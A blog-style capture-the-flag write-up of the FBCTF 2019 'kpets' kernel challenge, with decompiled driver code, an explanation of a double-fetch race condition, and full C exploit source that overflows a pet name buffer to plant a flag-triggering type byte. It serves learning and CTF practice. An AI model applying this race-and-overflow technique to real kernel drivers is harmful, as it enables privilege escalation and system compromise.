---
title: "A Long Rant and FBCTF 2019 - kpets"
description: "FBCTF 2019 kpets challenge writeup"
pubDate: "June 29 2019"
tags: ["rant", "ctf-writeup", "pwn", "kernel"]
---

## rant

After reading auxy blog about [linux kernel exploitation tutorial](http://www.auxy.xyz/tutorial/2019/06/10/Linux-Exp-Tutorial.html), I kinda wanted to write this into a blog post. I’m still rather new to kernel pwn, I’ve been learning this since there is two kernel pwn appearances in secfest CTF around May 2019 `xtore` and `brainfuck64`. Reason? I need something beside learning classical heap pwn and might be a good mood booster to do another large codebase code review.

`brainfuck64` seems like a classic heap challenge, but in kernelspace. I didn’t solve it tho, I literally just started this kernel pwn journey and didn’t even know what’s this `IOCTL` thing. Shortly, after ctf ends, I read [kileak writeup](https://kileak.github.io/ctf/2019/secfest-brainfuck64/), seems like my assumption is correct.

`xtore`, this is actually a blatant copy from [one of Root-Me.org kernel challenge](https://www.root-me.org/en/Challenges/App-System/LinKern-ARM-Stack-Overflow) (I haven’t solved this one at that time). Reversing the kernel module actually doesn’t give you many attack surface, not even race or overflow exists™ or is it(?). The flaw actually is in this recursive function where it copy a chunk user buffer to kernel stack at a time, when the buffer given larger than the chunk, it calls itself to continue copy the chunk from last chunk position and continue to call recursively until all buffer copied. This is fine as it sounds, but the kernel stack actually doesn’t have many room, only 8KB (2 memory pages), this could be a problem when a function uses too much stack memory or called **recursively**. This attack actually called `stack overflow`, where stack could grow to top address and over run thread_info. Writeup from teammate at OpenToAll, vakkz devcraft.io, [xtore - Security Fest 2019](https://devcraft.io/2019/05/28/xtore-security-fest-2019.html). Some light reading about this `Stack Overflow`, [phrack64 - Attacking the Core: Kernel Exploitation Notes](http://phrack.org/issues/64/6.html#article) and [Jon Oberheide - The Stack is Back](https://jon.oberheide.org/files/infiltrate12-thestackisback.pdf).

I’m playing with PDKT in FBCTF 2019, which has 1 challenge rhyme with my current learning curve, kpets, an easy-medium kernel challenge which I didn’t solve in time, TL;DR It’s a double-fetch where we could create race condition and make kernel copy more buffer than allocated. More detailed writeup continued below, where I’ll explain some failed attack ideas and dumb assumption where lead me into not solving this in time.

## desc

> We wrote a pet store application that was too slow, so we made a kernel module for it instead.
>
> nc 134.209.40.42 1337
>
> (Note: connecting to the problem mentions something about spectre. That's not the intended solution, but whatever works for you. Also when connecting to remote you can provide a URL to a VALID ELF FILE which will be downloaded and placed into the QEMU image to save you copying base64. This binary MUST BE an ELF and < 1MB
>
> Author: pippinthedog
>
> resource: [kpets](https://github.com/fbsamples/fbctf-2019-challenges/tree/master/pwnables/kpets)

## rev

From reversing the kernel module we could know that it creates device at `/dev/kpets`. As the desc implies, this is “a pet store” that live in kernel space and this `/dev/kpets` is an interface to the pet store. Also, from reversing this, there’s an important struct which will be used in this interface.

```c
struct kpets {
  int type;
  unsigned int name_len;
  char name[0x20];
  unsigned int desc_len;
  char desc[0x40];
};
```

### get the flag

To get the flag, we need to create a `kpets` with `kpets->type == '\xAA'` and read `/dev/kpets` to get flag buffer.

### create kpet

```c
__int64 __fastcall dev_write(__int64 a1, kpets *kpets_from_user, __int64 a3)
{
  int id; // eax
  kpets *kpets_id_ptr; // rbx
  char *v5; // r14
  char *v6; // rdi
  __int64 v8; // [rsp+0h] [rbp-40h]
  char type; // [rsp+Bh] [rbp-35h]
  unsigned int kpets_from_user_name_len; // [rsp+Ch] [rbp-34h]
  unsigned int kpets_from_user_desc_len; // [rsp+10h] [rbp-30h]
  unsigned int kpets_from_user_name_len_2; // [rsp+14h] [rbp-2Ch]
  char v13; // [rsp+18h] [rbp-28h]

  v8 = a3;
  copy_from_user(&kpets_from_user_name_len, &kpets_from_user->name_len, 4LL);
  if ( kpets_from_user_name_len > 0x20 )
  {
    printk("kpets: invalid pet name len: 0x%02x\n");
    return v8;
  }
  copy_from_user(&kpets_from_user_desc_len, &kpets_from_user->desc_len, 4LL);
  if ( kpets_from_user_desc_len > 0x40 )
  {
    printk("kpets: invalid pet description len: 0x%02x\n");
    return v8;
  }

  // maybe find first empty slot??
  id = max_pets - 1;
  if ( (int)max_pets - 1 < 0 )
  {
    if ( (_DWORD)max_pets )
    {
      kpets_id_ptr = (kpets *)first_slot;
      goto LABEL_9;
    }
  }
  else
  {
    kpets_id_ptr = (kpets *)first_slot;
    if ( !*(_BYTE *)first_slot )
      goto LABEL_9;
    while ( 1 )
    {
      --id;
      --kpets_id_ptr;
      if ( id == -1 )
        break;
      if ( !LOBYTE(kpets_id_ptr->type) )
        goto LABEL_9;
    }
  }
  kpets_id_ptr = (kpets *)first_slot;
  memset(chunk, 0, chunk_size);

  // IDK
LABEL_9:
  v5 = (char *)&kpets_from_user_name_len_2;
  kpets_from_user_name_len_2 = 0;
  do
  {
    v6 = v5++;
    get_random_bytes(v6, 1LL);
    msleep(1LL);
  }
  while ( v5 != &v13 );

  printk("kpets: your new pet owner is %s!");

  copy_from_user(&type, kpets_from_user, 1LL);
  if ( (unsigned __int8)(type + 64) > 1u && type != 0xC2u ) // Check for valid type
  {
    printk("kpets: invalid pet type: 0x%02hhx\n");
  }
  else
  {
    copy_from_user(&kpets_from_user_name_len_2, &kpets_from_user->name_len, 4LL);// second fetch!!!
    LOBYTE(kpets_id_ptr->type) = type;
    copy_from_user(kpets_id_ptr->name, kpets_from_user->name, kpets_from_user_name_len_2);
    copy_from_user(kpets_id_ptr->desc, kpets_from_user->desc, kpets_from_user_desc_len);
  }
  return v8;
}
```

To create `kpet`, we could write a `kpets` struct to `/dev/kpets`. There’s some check in place, 1. `kpet->name_len < 32` 2. `kpet->desc_len < 64` 3. `kpet->type` must be a valid type `'\xC0'` - `'\xC2'`

### read kpets

To read kpets, we could read `/dev/kpets` and see output from `dmesg` since the output is printed with `printk`.

## attacc

The vulnerability is in `dev_write`, where it tries to fetch 2 times at a user buffer (hence the double fetch).

```c
copy_from_user(&kpets_from_user_name_len, &kpets_from_user->name_len, 4LL);
if ( kpets_from_user_name_len > 0x20 ) {
  // die
}
...
copy_from_user(&kpets_from_user_name_len_2, &kpets_from_user->name_len, 4LL); // second fetch!!!
copy_from_user(kpets_id_ptr->name, kpets_from_user->name, kpets_from_user_name_len_2);
```

To exploit this we could use race condition to create change `kpets->name_len` just enough to bypass the first check and overflow the buffer. Remember that we only need to create the `kpet->type == '\xAA'` to get the flag? we could just overwrite the next `kpet->type` to `0xAA` using overflow on current `kpet->name` buffer.

## exploit

Rather than explaining the exploit method, here a commented source code.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define KDOG   0xC0
#define KCAT   0xC1
#define KSHEEP 0xC2
#define KFLAG  0xAA

typedef struct kpets {
  int type;
  unsigned int name_len;
  char name[0x20];
  unsigned int desc_len;
  char desc[0x41]; // overwrite next->type
} kpets;

static int fd;
static kpets* pet;

static void *evil_thread()
{
  /*
   * This will change the name_len between 0 and 0x65 forever,
   * current->name[0x20] + current->desc_len[0x4] +
   * current->desc[0x40] + next->type[0x1] == 0x65, and hope
   * that 0 will hit the first length check and 0x65 when hit
   * the second fetch and surely overwrite our next kpet->type
   */
  for(;;) pet->name_len ^= 0x65;
  return NULL;
}

int main(int argc, char const *argv[]) {
  pthread_t pth1;
  kpets kpet;

  char buf[256];
  memset(buf, 0, sizeof(buf));

  fd = open("/dev/kpets", O_RDWR);
  pet = &kpet;
  memset(pet, 0, sizeof(kpets));

  pet->type = KDOG;
  pet->name_len = 0;
  pet->desc_len = 0;
  pet->desc[0x40] = KFLAG;

  // Run a separate thread to race
  pthread_create(&pth1, NULL, evil_thread, NULL);

  write(fd, pet, 0x6C);

  for (;;) {
    write(fd, pet, 0x6C);
    read(fd, buf, sizeof(buf));
    // If there's a non-null bytes in our buffer from
    // our read, it means we succeed to get the flag
    if (buf[0]) {
      write(1, buf, sizeof(buf));we
      break;
    }
  }

  return 0;
}
```

Runinng this on server, we immediately get the flag,

    fb{lets_try_that_again__double_the_fetch_for_double_the_fun}

## failed attack ideas

slow branch condition

```c
for(;;) pet->name_len = 0x64 + (rand() & 1);
```

notice that I’m using XOR on name_len to create where it changes between 0 and 0x65, but here I thought just change the value using branch condition would succeed, but that’s not gonna happen. I’ve tried to change the `rand()` to a static random buffer read from ‘/dev/urandom’ and that failed too. At this point, I thought maybe there’s something todo with the qemu start script where it has `thread=1` option,

```sh
qemu-system-x86_64 \
    -m 64M -smp 1,cores=1,threads=1 \
    --enable-kvm \
    -kernel $1 \
    -nographic \
    -append "console=ttyS0 noapic quiet" \
    -initrd $2 \
    -monitor /dev/null -s
```

thus, I started to find another attack surface for this since I thought race condition isn’t an option here (and… well.. It fails miserably). sad.
